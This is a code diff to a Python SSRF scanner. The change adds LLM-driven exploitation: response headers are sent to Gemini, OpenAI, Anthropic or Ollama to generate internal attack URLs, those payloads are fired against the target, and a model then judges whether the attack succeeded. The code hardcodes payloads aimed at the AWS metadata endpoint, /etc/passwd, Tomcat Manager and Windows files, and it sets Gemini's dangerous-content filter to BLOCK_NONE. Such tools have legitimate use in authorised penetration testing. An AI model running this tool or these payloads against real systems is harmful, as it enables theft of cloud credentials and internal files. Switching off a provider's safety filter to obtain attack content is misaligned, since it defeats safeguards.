@@ -1,7 +1,7 @@
 #!/usr/bin/env python3
 
 import queue
-from threading import Thread
+from threading import Thread, Lock
 from bs4 import BeautifulSoup
 from urllib.parse import urlparse
 import sys
@@ -12,6 +12,12 @@ import base64, xml.etree.ElementTree
 import urllib
 import json
 from requests.packages.urllib3.exceptions import InsecureRequestWarning
+import os
+import google.generativeai as genai
+from google.generativeai.types import HarmCategory, HarmBlockThreshold
+import ollama
+import openai
+import anthropic
 
 banner="""
  ### #### ####        ### #   # ###   #### # # 
@@ -30,10 +36,333 @@ parser.add_argument("-H", "--host", dest="host", metavar="HOST", required=True)
 parser.add_argument("-t", "--threads", dest="threads", metavar="THREADS")
 parser.add_argument("-c","--cookies", nargs='+', dest="cookies", metavar="COOKIES")
 parser.add_argument("-v","--verbose", dest="verbose", action='store_true')
-parser.add_argument("-p","--payload", dest="payload")
 parser.add_argument("-b", "--burp",dest="burp",help="provide a burp file", action="store")
+parser.add_argument("-p","--provider", dest="provider", help="llm provider: google, openai, anthropic, ollama", default=None)
+parser.add_argument("-m","--model", dest="model", help="model name: gemini-1.5-flash, gpt-4, llama3", default=None)
+parser.add_argument("-a","--api-key", dest="api_key", help="API Key (or set env var API_KEY)", default=None)
 
 args = parser.parse_args()
+
+# --- LLM CLIENT SETUP (Global) ---
+llm_client = None
+API_KEY = args.api_key or os.environ.get('API_KEY')
+VULNERABLE_URLS = []
+print_lock = Lock()
+
+if args.provider:
+    print(f"\033[94m[*] Configuring AI Provider: {args.provider} ({args.model})\033[0m")
+    
+    if "ollama" not in args.provider and API_KEY is None:
+        print(f"\033[91m[!] Error: {args.provider} requires an API key. Use --api-key or set API_KEY env var.\033[0m")
+        sys.exit(1)
+        
+    if args.model is None:
+         print(f"\033[91m[!] Error: Model name is required. Use --model.\033[0m")
+         sys.exit(1)
+
+    try:
+        if "google" in args.provider:
+            genai.configure(api_key=API_KEY)
+            llm_client = genai.GenerativeModel(args.model)
+        elif "openai" in args.provider:
+            llm_client = openai.OpenAI(api_key=API_KEY)
+        elif "anthropic" in args.provider:
+            llm_client = anthropic.Anthropic(api_key=API_KEY)
+        elif "ollama" in args.provider:
+            llm_client = None # Ollama lib handles connection internally usually
+        else:
+            print(f"Unsupported provider: {args.provider}")
+            sys.exit(1)
+    except ImportError as e:
+        print(f"\033[91m[!] Missing library for {args.provider}: {e}\033[0m")
+        sys.exit(1)
+
+# --- INTEGRATED LLM FUNCTION ---
+def send_to_llm(system_instructions, user_content):
+    """
+    Sends a prompt to the configured LLM provider with retry logic.
+    Converted to Synchronous to fit the thread model of the scanner.
+    """
+    if not args.provider:
+        return None
+
+    # Combine instructions for simple prompt APIs
+    complete_prompt = system_instructions + "\n\n" + user_content
+    retry_delay = 2  
+    max_retries = 3  
+
+    for attempt in range(max_retries):
+        try:
+            if "google" in args.provider:
+                # Synchronous call
+                response = llm_client.generate_content(
+                    [complete_prompt],
+                    safety_settings={
+                        HarmCategory.HARM_CATEGORY_DANGEROUS_CONTENT: HarmBlockThreshold.BLOCK_NONE,
+                    }
+                )
+                return response.text
+
+            elif "ollama" in args.provider:
+                response = ollama.generate(model=args.model, format="json", prompt=complete_prompt)
+                return response['response']
+
+            elif "openai" in args.provider:
+                chat_completion = llm_client.chat.completions.create(
+                    messages=[
+                        {"role": "system", "content": system_instructions},
+                        {"role": "user", "content": user_content},
+                    ],
+                    model=args.model,
+                    response_format={"type": "json_object"}
+                )
+                return chat_completion.choices[0].message.content
+
+            elif "anthropic" in args.provider:
+                message = llm_client.messages.create(
+                    model=args.model,
+                    max_tokens=4096,
+                    system=system_instructions,
+                    messages=[
+                        {"role": "user", "content": user_content}
+                    ]
+                )
+                return message.content[0].text
+
+        except Exception as e:
+            # Check for Rate Limit errors generic text since libraries differ
+            if "429" in str(e) or "quota" in str(e).lower():
+                print(f"[!] Rate limit. Retrying in {retry_delay}s...")
+                time.sleep(retry_delay)
+                retry_delay *= 2
+            else:
+                print(f"[!] LLM API Error: {e}")
+                traceback.print_exc()
+                return None
+    return None
+
+def pause_for_confirmation(url, reason):
+    """
+    Acquires a lock to pause console output, alerts the user, 
+    and waits for input to continue.
+    """
+    with print_lock:
+	    try:
+		    input(f"\033[93mPress [ENTER] to continue hunting other parameters...\033[0m")
+	    except KeyboardInterrupt:
+		    print("\nExiting...")
+		    sys.exit()
+	    print("\n[+] Resuming scan...\n")
+
+#Generate SSRF payloads with LLM
+def generate_payloads_with_llm(response_object):
+    """
+    Step 1: Ask LLM to generate payloads based ONLY on Response Headers.
+    We ignore the body because we know it's just 'example.com' content.
+    """
+    
+    # 1. Format Headers into a clean block
+    # We filter out standard/boring headers (Date, Content-Length) to save tokens
+    # and focus on the interesting ones (Server, X-Powered-By, Cookies, Via).
+    interesting_headers = {}
+    ignore_keys = ["date", "content-length", "content-type", "connection", "etag", "last-modified"]
+    
+    for k, v in response_object.headers.items():
+        if k.lower() not in ignore_keys:
+            interesting_headers[k] = v
+            
+    headers_text = json.dumps(interesting_headers, indent=2)
+
+    system_prompt = """
+    You are an expert Red Teamer specializing in SSRF.
+    I have confirmed a Non-Blind SSRF vulnerability on a target server.
+    
+    I am providing the HTTP RESPONSE HEADERS returned by the vulnerable server.
+    
+    TASK:
+    1. Analyze headers like 'Server', 'X-Powered-By', 'Set-Cookie', 'Via', or 'X-Amz-Id' to fingerprint the internal technology stack.
+    2. Based on the stack, generate a JSON list of atleast 10 specific internal URLs to exploit it with maximum of 20.
+    
+    LOGIC:
+    - 'Server: EC2' or 'X-Amz' -> Suggest AWS Metadata (http://169.254.169.254/latest/meta-data/).
+    - 'JSESSIONID', 'Tomcat', 'Jetty' -> Suggest Tomcat Manager (http://127.0.0.1:8080/manager/html).
+    - 'Gunicorn', 'Werkzeug', 'Python' -> Suggest local internal ports (8000, 5000).
+    - 'PHP' -> Suggest php://filter attacks or /var/www/html/index.php.
+    - 'Microsoft-IIS' -> Suggest Windows file paths (file://C:/Windows/win.ini).
+    - If generic/unknown -> Suggest standard /etc/passwd and localhost ports (80, 8080).
+    
+    Output strictly a JSON object:
+    { "payloads": ["url1", "url2"] }
+    """
+    
+    user_content = f"--- CAPTURED HEADERS ---\n{headers_text}"
+    
+    print(f"\033[95m[AI] Analyzing {len(interesting_headers)} headers to fingerprint tech stack...\033[0m")
+    if args.verbose:
+        print(f"[debug] Headers sent to AI:\n{headers_text}")
+
+    ai_response = send_to_llm(system_prompt, user_content)
+    
+    payloads = []
+    if ai_response:
+        try:
+            clean_json = ai_response.replace("```json", "").replace("```", "").strip()
+            data = json.loads(clean_json)
+            payloads = data.get("payloads", [])
+        except Exception as e:
+            print(f"[!] Failed to parse generated payloads: {e}")
+            
+    return payloads
+
+# Check responses with LLM if SSRF payload was succesfull
+def analyze_ssrf_result_with_llm(target_url, response_text):
+    """
+    Step 2: Ask LLM to validate if the attack was successful.
+    """
+    # Truncate to save tokens, but keep enough to see leaked data
+    content_snippet = response_text[:1000]
+    
+    system_prompt = """
+    You are a Vulnerability Validator.
+    I executed an SSRF payload. Analyze the response to determine if it was SUCCESSFUL.
+    
+    Criteria for VULNERABLE:
+    - Contains sensitive data (root:x:0, AMI IDs, internal IP addresses).
+    - access to internal dashboards (Tomcat Manager, K8s API).
+    - Directory listings of internal server or files.
+    
+    Criteria for SAFE/FAILED:
+    - Standard 404/403 error pages.
+    - Empty responses.
+    - Generic firewall block pages.
+    
+    Output strictly JSON:
+    {
+        "status": "VULNERABLE" or "SAFE",
+        "reason": "One sentence explaining why."
+    }
+    """
+    
+    user_content = f"Payload: {target_url}\n\nResponse:\n{content_snippet}"
+    
+    ai_response = send_to_llm(system_prompt, user_content)
+    
+    if ai_response:
+        try:
+            clean_json = ai_response.replace("```json", "").replace("```", "").strip()
+            data = json.loads(clean_json)
+            return data
+        except:
+            return None
+    return None
+
+# --- AI PIVOT LOGIC ---
+def smart_pivot_to_internal(paramName, original_url, initial_response_text):
+    """
+    Orchestrator: Generates payloads -> Executes -> Validates.
+    """
+    if not args.provider:
+        return
+	
+    # 1. GENERATE
+    custom_payloads = generate_payloads_with_llm(initial_response_text)
+    if not custom_payloads:
+        print("[AI] LLM failed to generate payloads. Falling back to hardcoded list.")
+        custom_payloads = [
+            "http://127.0.0.1:80", 
+            "file:///etc/passwd", 
+            "http://169.254.169.254/latest/meta-data/"
+        ]
+    else:
+        print(f"\033[92m[AI] Generated {len(custom_payloads)} context-aware payloads.\033[0m")
+
+    # 2. EXECUTE LOOP
+    regex = paramName + "=(.*?)(?:&|$)"
+    match = re.search(regex, original_url)
+    if not match: return
+    val_to_replace = match.group(1)
+
+    for payload in custom_payloads:
+        print(f"\033[96m[AI-Test] Trying: {payload}\033[0m")
+        attack_url = original_url.replace(val_to_replace, payload)
+        
+        try:
+            # Short timeout for internal probes
+            r = requests.get(attack_url, verify=False, timeout=4)
+            
+            # Optimization: Skip obviously empty/failed requests to save AI costs
+            if r.status_code >= 400 and len(r.text) < 200:
+                continue
+
+            # 3. VALIDATE
+            result = analyze_ssrf_result_with_llm(payload, r.text)
+            
+            if result and result.get("status") == "VULNERABLE":
+                print(f"\033[91m[!!!] CONFIRMED HIT: {attack_url}\033[0m")
+                print(f"\033[93m      Reason: {result.get('reason')}\033[0m")
+				
+                VULNERABLE_URLS.append({
+                    "type": "Internal SSRF (AI Verified)",
+                    "url": attack_url,
+                    "payload": payload,
+                    "reason": result.get('reason')
+                })
+                pause_for_confirmation(attack_url, result.get('reason'))
+				
+                
+        except Exception as e:
+            # print(f"    Failed: {e}")
+            pass
+
+# A safe, predictable external URL to test fetching
+CANARY_URL = "http://example.com"
+CANARY_SIGNATURE = "Example Domain"
+
+#Make an external request first, so lets its less noisy to find out if redirection is happening.
+def check_non_blind_ssrf(paramName, original_url):
+	"""
+	1. Injects a known external URL (example.com).
+	2. Checks if the target server returns the content of that URL.
+	3. If yes, confirms Non-Blind SSRF.
+	"""
+	
+	# 1. Construct the Payload
+	# We use the regex logic you already had to replace the parameter value
+	regexToReplace = paramName + "=(.*?)(?:&|$)"
+	match = re.search(regexToReplace, original_url)
+	
+	if not match:
+		return False
+		
+	parameterValuetoReplace = match.group(1)
+	
+	# Inject the Canary URL
+	attack_url = re.sub(parameterValuetoReplace, CANARY_URL, original_url)
+	
+	print(f"\033[94m[*] Probing for Non-Blind SSRF on '{paramName}' with canary: {CANARY_URL}\033[0m")
+	
+	try:
+		# 2. Fire the Request
+		# We need verify=False because many targets have bad certs
+		# specific timeout prevents hanging if the server tries to resolve and fails
+		response = requests.get(attack_url, verify=False, timeout=10)
+		
+		# 3. Analyze the Response (The "Non-Blind" Check)
+		if CANARY_SIGNATURE in response.text:
+			print(f"\033[91m[+] POTENTIAL VULNERABLE (Non-Blind)! The server fetched example.com and returned its content.\033[0m")
+			print(f"\033[91m    URL: {attack_url}\033[0m")
+			
+			# 4. PIVOT: Since we confirmed it can fetch external, let's try Internal!
+			smart_pivot_to_internal(paramName, original_url, response)
+			return True
+			
+		else:
+			print(f"[-] Failed. Server did not return canary content.")
+			return False
+
+	except Exception as e:
+		print(f"[!] Error probing {paramName}: {e}")
+		return False
 
 validateHost_regex="^(http:\/\/www\.|https:\/\/www\.|http:\/\/|https:\/\/)[a-z0-9]+([\-\.]{1}[a-z0-9]+)*\.[a-z]{2,5}(:[0-9]{1,5})?(\/.*)?$"
 validateHostIpWithPort_regex="^https?:\/\/(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])?:?[0-9]+$"
@@ -43,9 +372,9 @@ if not(re.match(validateHost_regex,args.host) or re.match(validateHostIpWithPort
     print ("Terminating... Please enter Host in the format http://google.com or https://google.com or http://10.10.10.10 for internal hosts")
     sys.exit()
 
-if args.payload and not re.match(validateHost_regex,args.payload) and not re.match(validateHostIpWithPort_regex,args.payload):
-        print ("Terminating... Please enter Host in the format http://google.com or http://192.168.1.1:80")
-        sys.exit()
+#if args.payload and not re.match(validateHost_regex,args.payload) and not re.match(validateHostIpWithPort_regex,args.payload):
+#        print ("Terminating... Please enter Host in the format http://google.com or http://192.168.1.1:80")
+#        sys.exit()
 
 #Keeps a record of links which are already saved and are present just once in the queue
 linksVisited=set()
@@ -68,14 +397,14 @@ if args.cookies:
 		cookiesDict[cook[:cook.find("=")]]=cook[cook.find("=")+1:]
 
 #Making an external request to a hostname through the potential vulnerable parameter to validate SSRF
-def makingExternalRequests(paramName, url):
-	regexToReplace=paramName+"=(.*?)(?:&|$)"
-	parameterValuetoReplace=re.search(regexToReplace,url).group(1)
+#def makingExternalRequests(paramName, url):
+#	regexToReplace=paramName+"=(.*?)(?:&|$)"
+#	parameterValuetoReplace=re.search(regexToReplace,url).group(1)
 
 	#Adding paramname 'args.payload+"/"+paramName,' at the end of burp collaborator url to differentiate which param succeeded to make external request.
-	formingPayloadURL=re.sub(parameterValuetoReplace,args.payload+"/"+paramName,url)
-	print ("\033[91m[+] Making external request with the potential vulnerable url:"+formingPayloadURL)
-	requests.get(formingPayloadURL)
+#	formingPayloadURL=re.sub(parameterValuetoReplace,args.payload+"/"+paramName,url)
+#	print ("\033[91m[+] Making external request with the potential vulnerable url:"+formingPayloadURL)
+#	requests.get(formingPayloadURL)
 
 #This checks against URL keywords in param NAME
 def matchURLKeywordsInName(getOrForm,paramName,url):
@@ -87,8 +416,8 @@ def matchURLKeywordsInName(getOrForm,paramName,url):
 		print ("\033[92m[-] Potential vulnerable '{}' parameter {} '{}' at '{}'".format(getOrForm,"Name",paramName,url))
 		ssrfVul.add(temp)
 		#Trying to make an external request to validate potential SSRF (Only for GET parameter for now) 	
-		if args.payload and getOrForm == "GET":
-			makingExternalRequests(paramName,url)
+		if getOrForm == "GET":
+			check_non_blind_ssrf(paramName,url)
 
 #This checks URL pattern in param VALUE and also if an IP is passed somewhere in the values
 def matchURLPatternInValue(getOrForm, paramName,paramValues,url):
@@ -101,8 +430,8 @@ def matchURLPatternInValue(getOrForm, paramName,paramValues,url):
 	if temp not in ssrfVul and (re.match("^(http:\/\/www\.|https:\/\/www\.|http:\/\/|https:\/\/)?[a-z0-9]+([\-\.]{1}[a-z0-9]+)*\.[a-z]{2,5}(:[0-9]{1,5})?(\/.*)?$",paramValues) or re.match("((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)(\.|$)){4}",paramValues)):
 		print ("\033[92m[-] Potential vulnerable '{}' parameter {} '{}' at '{}'".format(getOrForm, "Value" if paramName=="" else "Name",paramValues if paramName=="" else paramName,url))
 		ssrfVul.add(temp)
-		if args.payload and getOrForm == "GET":
-			makingExternalRequests(paramName,url)
+		if getOrForm == "GET":
+			check_non_blind_ssrf(paramName,url)
 
 
 def checkForGetRequest(url):
@@ -135,16 +464,16 @@ def burp_matchURLKeywordsInName(getOrForm,paramName,url):
 	if re.search(matchList,paramName,re.I):
 		print ("\033[92m[-] Potential vulnerable '{}' parameter {} '{}' at '{}'".format(getOrForm,"Name",paramName,url))
 		#Trying to make an external request to validate potential SSRF (Only for GET parameter for now)
-		if args.payload and getOrForm == "GET":
-			makingExternalRequests(paramName,url)
+		if getOrForm == "GET":
+			check_non_blind_ssrf(paramName,url)
 
 #This checks URL pattern in param VALUE and also if an IP is passed somewhere in the values
 def burp_matchURLPatternInValue(getOrForm, paramName,paramValues,url):
 	#Regex is changed since Form parameters sometimes have array or other object in their values
 	if (re.match("(http:\/\/www\.|https:\/\/www\.|http:\/\/|https:\/\/)?[a-z0-9]+([\-\.]{1}[a-z0-9]+)*\.[a-z]{2,5}(:[0-9]{1,5})?(\/.*)?",str(paramValues)) or re.match("((25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){3}(25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)",str(paramValues))):
 		print ("\033[92m[-] Potential vulnerable '{}' parameter {} '{}' at '{}'".format(getOrForm, "Value" if paramName=="" else "Name",paramValues if paramName=="" else paramName,url))
-		if args.payload and getOrForm == "GET":
-			makingExternalRequests(paramName,url)
+		if getOrForm == "GET":
+			check_non_blind_ssrf(paramName,url)
 
 post_throwAwayListForRest=set()
 post_throwAwayGetReqs={}
@@ -424,4 +753,19 @@ for i in range(num_threads):
 
 q.join()
 
-print ("\nProcess Completed")
+
+print("\n" + "="*70)
+print(f" SCAN COMPLETED ")
+print("="*70)
+
+if len(VULNERABLE_URLS) > 0:
+    print(f"\033[91m[!] FOUND {len(VULNERABLE_URLS)} CONFIRMED VULNERABILITIES:\033[0m\n")
+    for idx, vuln in enumerate(VULNERABLE_URLS, 1):
+        print(f"  {idx}. [{vuln['type']}]")
+        print(f"     Attack URL: {vuln['url']}")
+        print(f"     Payload:    {vuln['payload']}")
+        print(f"     Reason:     {vuln['reason']}")
+        print("-" * 50)
+else:
+    print("\033[92m[+] No confirmed SSRF vulnerabilities found.\033[0m")
+print("="*70 + "\n")
